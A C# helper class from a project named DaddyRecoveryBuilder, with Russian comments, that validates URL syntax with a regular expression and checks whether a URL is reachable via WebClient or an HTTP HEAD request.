namespace DaddyRecoveryBuilder.Helpers
{
    using System;
    using System.Net;
    using System.Text.RegularExpressions;

    public static class NetControl
    {
        /// <summary>
        /// Метод для проверки ссылки на корректность ввода
        /// </summary>
        /// <param name="URL">Ссылка</param>
        /// <returns>True/False</returns>
        public static bool IsValidURL(string URL)
        {
            string Pattern = @"^(http|https)?:\/\/(\S+)+$";
            try
            {
                var Rgx = new Regex(Pattern, RegexOptions.Compiled | RegexOptions.IgnoreCase);
                return Rgx.IsMatch(URL);
            }
            catch { return false; }
        }

        public static bool CheckURLOnlineOrNot(string url)
        {
            try
            {
                using var client = new WebClient();
                using System.IO.Stream stream = client.OpenRead(url);
                return true;
            }
            catch { return false; }
        }

        /// <summary>
        /// Метод для проверки ссылки на доступность
        /// </summary>
        /// <param name="url">Ссылка для проверки</param>
        /// <param name="TimeOut">Время ожидания</param>
        /// <param name="Head">Метод запроса</param>
        /// <returns></returns>
        public static bool CheckURL(string url, int TimeOut = 0x3A98, string Head = "HEAD")
        {
            var request = (HttpWebRequest)WebRequest.Create(url);
            request.Timeout = TimeOut;
            request.Method = Head;
            try
            {
                using var response = (HttpWebResponse)request?.GetResponse();
                return response.StatusCode == HttpStatusCode.OK;
            }
            catch (Exception) { return false; }
        }
    }
}